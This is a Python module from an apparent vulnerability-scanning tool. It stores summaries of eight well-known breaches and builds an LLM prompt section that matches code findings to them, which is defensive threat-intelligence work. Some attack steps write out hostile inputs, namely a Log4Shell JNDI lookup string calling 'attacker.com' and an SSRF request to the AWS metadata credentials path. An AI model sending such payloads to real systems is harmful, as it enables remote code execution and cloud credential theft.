"""
Historical Breach Knowledge Base — Attack Chain Mapper.

Contains structured data on the most devastating real-world cyber attacks.
This knowledge is injected into the LLM reasoning prompt so that the AI can
correlate discovered attack chains with historical breach patterns, turning
abstract vulnerabilities into executive-level threat intelligence.
"""

HISTORICAL_BREACHES = [
    {
        "name": "SolarWinds Orion Supply Chain (2020)",
        "year": 2020,
        "impact": "18,000 organizations compromised including US Treasury, Pentagon, Microsoft.",
        "attack_class": "Supply Chain",
        "mitre_tactics": ["Initial Access (Supply Chain Compromise)", "Persistence", "Defense Evasion", "Lateral Movement", "Exfiltration"],
        "root_causes": ["Malicious code injected into software build pipeline", "Unsigned or unpinned third-party dependency", "No code-signing verification", "Overly broad network access from monitoring software"],
        "attack_steps": [
            "Attacker gained access to the SolarWinds build server.",
            "Malicious DLL (SUNBURST) was injected into the signed Orion software update.",
            "18,000+ customers automatically installed the malicious update.",
            "The DLL lay dormant for 14 days to evade sandbox analysis.",
            "It then beaconed to attacker-controlled C2 servers for instructions.",
            "Lateral movement across victim networks using stolen credentials.",
            "Silent exfiltration of sensitive emails and classified documents for months."
        ],
        "indicators": ["supply-chain", "missing-lockfile", "unpinned-deps", "risky-script-postinstall", "missing-code-signing"]
    },
    {
        "name": "Log4Shell (CVE-2021-44228)",
        "year": 2021,
        "impact": "Billions of devices exposed; exploited by nation-states within hours of disclosure.",
        "attack_class": "Remote Code Execution via Transitive Dependency",
        "mitre_tactics": ["Initial Access (Exploit Public-Facing Application)", "Execution", "Persistence", "Lateral Movement"],
        "root_causes": ["JNDI lookup feature enabled by default in Log4j 2.x", "Unsanitized user input passed directly to logger", "Transitive dependency not tracked by developers", "No input validation on HTTP headers"],
        "attack_steps": [
            "Attacker sends a crafted HTTP request containing `${jndi:ldap://attacker.com/a}` in any logged field (User-Agent, URL, username, etc.).",
            "The Log4j library processes the JNDI lookup expression.",
            "The server makes an outbound LDAP request to the attacker's server.",
            "The attacker's LDAP server responds with a malicious Java class.",
            "The victim server deserializes and executes the attacker's class — arbitrary code execution.",
            "Attacker deploys reverse shell, cryptominer, or ransomware."
        ],
        "indicators": ["unsanitized-input", "eval", "exec", "unsafe-deserialization", "jndi", "unpinned-deps", "log-injection"]
    },
    {
        "name": "Equifax Data Breach (2017)",
        "year": 2017,
        "impact": "147 million Americans' SSNs, DOBs, and credit card data stolen.",
        "attack_class": "Unpatched Framework RCE + Lateral Movement",
        "mitre_tactics": ["Initial Access (Exploit Public-Facing Application)", "Execution", "Discovery", "Lateral Movement", "Exfiltration"],
        "root_causes": ["Unpatched Apache Struts (CVE-2017-5638)", "Missing input validation on Content-Type header", "Flat network architecture with no segmentation", "Expired TLS certificate on traffic inspection tool (blind spot)", "143 days before patch was applied"],
        "attack_steps": [
            "Attacker exploited Apache Struts CVE-2017-5638 via a malformed Content-Type HTTP header.",
            "Gained initial shell access on the Equifax dispute portal server.",
            "Pivoted through internal network due to lack of network segmentation.",
            "Discovered and accessed 48 unprotected internal databases.",
            "Exfiltrated data over 76 days via 9,000 HTTP queries disguised as normal traffic.",
            "Data was compressed and encrypted before egress to avoid DLP detection."
        ],
        "indicators": ["unpatched-dependency", "missing-input-validation", "hardcoded-credentials", "no-rate-limiting", "semgrep-finding"]
    },
    {
        "name": "Capital One SSRF Breach (2019)",
        "year": 2019,
        "impact": "106 million customer records; $80M fine. Root cause: a single misconfigured WAF.",
        "attack_class": "Server-Side Request Forgery (SSRF) to Cloud Metadata",
        "mitre_tactics": ["Initial Access (Exploit Public-Facing Application)", "Credential Access (Cloud Metadata)", "Collection", "Exfiltration"],
        "root_causes": ["Misconfigured Web Application Firewall (WAF)", "AWS EC2 metadata service accessible from the application", "Overly broad IAM role permissions on the EC2 instance", "No SSRF-specific input filtering"],
        "attack_steps": [
            "Attacker identified an SSRF vulnerability in Capital One's web application.",
            "Sent a crafted HTTP request that caused the server to make a request to http://169.254.169.254/latest/meta-data/iam/security-credentials/.",
            "The misconfigured WAF did not block requests to the AWS metadata IP.",
            "Received temporary AWS IAM credentials from the metadata service.",
            "Used the credentials to list and download S3 bucket contents.",
            "Exfiltrated 100+ million customer records from S3 buckets."
        ],
        "indicators": ["ssrf", "url-redirect", "unvalidated-redirect", "hardcoded-aws-key", "open-redirect"]
    },
    {
        "name": "MOVEit Transfer SQL Injection (2023)",
        "year": 2023,
        "impact": "2,500+ organizations affected including US government agencies; 90M+ records stolen by Cl0p ransomware group.",
        "attack_class": "SQL Injection in File Transfer Software",
        "mitre_tactics": ["Initial Access (Exploit Public-Facing Application)", "Persistence (Web Shell)", "Discovery", "Exfiltration"],
        "root_causes": ["SQL injection vulnerability in MOVEit Transfer web app", "No parameterized queries", "Unauthenticated endpoints exposed to the internet", "Insufficient input validation on uploaded file metadata"],
        "attack_steps": [
            "Attacker discovered SQL injection vulnerability in MOVEit Transfer's web application.",
            "Sent crafted HTTP requests to extract data directly from the database.",
            "Retrieved service accounts and credentials from the database.",
            "Uploaded a webshell (LEMURLOOT) to the MOVEit server for persistent access.",
            "Used the webshell to enumerate and download files from all connected organizations.",
            "Mass-exfiltrated data before the vulnerability was publicly disclosed."
        ],
        "indicators": ["sql-injection", "no-parameterized-query", "hardcoded-credentials", "file-upload-unrestricted", "semgrep-finding"]
    },
    {
        "name": "npm Event-Stream Malicious Package (2018)",
        "year": 2018,
        "impact": "Millions of Node.js apps exposed; targeted theft of Bitcoin wallets.",
        "attack_class": "Malicious NPM Package / Dependency Confusion",
        "mitre_tactics": ["Initial Access (Supply Chain via Dependency Confusion)", "Execution", "Credential Access"],
        "root_causes": ["Maintainer transferred package ownership to unknown party", "No code review of npm package updates", "Missing lockfile allowed silent version upgrade", "transitive dependency not audited"],
        "attack_steps": [
            "The original maintainer of `event-stream` transferred ownership to an unknown actor.",
            "New owner published a new version that added a malicious transitive dependency: `flatmap-stream`.",
            "The malicious code was obfuscated and only activated for the `copay` Bitcoin wallet.",
            "When a Copay user ran the app, the malicious code decrypted itself.",
            "It searched for private Bitcoin keys in memory and exfiltrated them.",
            "Millions of users downloaded the compromised package before it was discovered."
        ],
        "indicators": ["missing-lockfile", "unpinned-deps", "risky-script-postinstall", "supply-chain-risk", "unverified-package"]
    },
    {
        "name": "Heartbleed OpenSSL Buffer Over-Read (2014)",
        "year": 2014,
        "impact": "~17% of the internet's secure servers exposed; private keys, passwords, and session tokens stolen.",
        "attack_class": "Memory Safety / Buffer Over-Read",
        "mitre_tactics": ["Initial Access (Exploit Public-Facing Application)", "Credential Access", "Collection"],
        "root_causes": ["Missing bounds check on user-supplied length field in TLS heartbeat extension", "No memory allocation validation", "Silent failure mode — no error thrown on over-read", "C code with manual memory management"],
        "attack_steps": [
            "Attacker sends a TLS heartbeat request with a payload and a forged length field (e.g., claims 1 byte but requests 64KB).",
            "OpenSSL reads up to 64KB of server memory into the response without bounds checking.",
            "Each response leaks a random 64KB chunk of the server's active memory.",
            "By repeating the request, the attacker collects server private keys, session tokens, and passwords.",
            "With the server's private key, the attacker can decrypt all past and future TLS traffic."
        ],
        "indicators": ["buffer-overflow", "memory-safety", "unvalidated-input-length", "c-code", "unsafe-memory"]
    },
    {
        "name": "Uber Data Breach via HackerOne Exposed Credentials (2022)",
        "year": 2022,
        "impact": "Full Uber internal network compromise via social engineering + hardcoded credentials.",
        "attack_class": "Social Engineering + Hardcoded Credentials in Private Repos",
        "mitre_tactics": ["Initial Access (Phishing/Social Engineering)", "Credential Access (Hardcoded Secrets)", "Privilege Escalation", "Lateral Movement"],
        "root_causes": ["MFA fatigue attack via SMS spam", "Hardcoded AWS credentials found in a private GitHub repo after initial access", "Overly permissive IAM roles", "Credentials stored in plaintext script files"],
        "attack_steps": [
            "Attacker purchased an Uber contractor's VPN credentials on the dark web.",
            "Performed MFA-fatigue attack (SMS bombing) until the contractor approved the login.",
            "Gained access to Uber's internal VPN.",
            "Found a PowerShell script on a network share containing hardcoded admin credentials.",
            "Used those credentials to access Uber's PAM (Privileged Access Management) system.",
            "Gained access to AWS, GCP, HackerOne private bug reports, Slack, and more."
        ],
        "indicators": ["hardcoded-credentials", "hardcoded-secret", "hardcoded-password", "api-key-in-code", "plaintext-secret"]
    },
]


def get_breach_context_prompt() -> str:
    """
    Returns a formatted string summarizing all historical breaches for injection
    into the LLM's system prompt.
    """
    lines = [
        "## HISTORICAL CYBER BREACH DATABASE",
        "You have knowledge of the following devastating real-world security breaches.",
        "When reasoning about attack chains in the current codebase, you MUST identify",
        "which historical breach the chain most closely resembles and include that in",
        "your output as 'historical_similarity'.",
        "",
    ]

    for breach in HISTORICAL_BREACHES:
        lines.append(f"### [{breach['year']}] {breach['name']}")
        lines.append(f"  - Class: {breach['attack_class']}")
        lines.append(f"  - Impact: {breach['impact']}")
        lines.append(f"  - Root Causes: {', '.join(breach['root_causes'][:3])}")
        lines.append(f"  - Indicator Rule IDs: {', '.join(breach['indicators'])}")
        lines.append("")

    lines.append(
        "When findings match the 'Indicator Rule IDs' of a breach, estimate a similarity "
        "percentage (0-100) and cite the breach name and year in your response."
    )
    return "\n".join(lines)
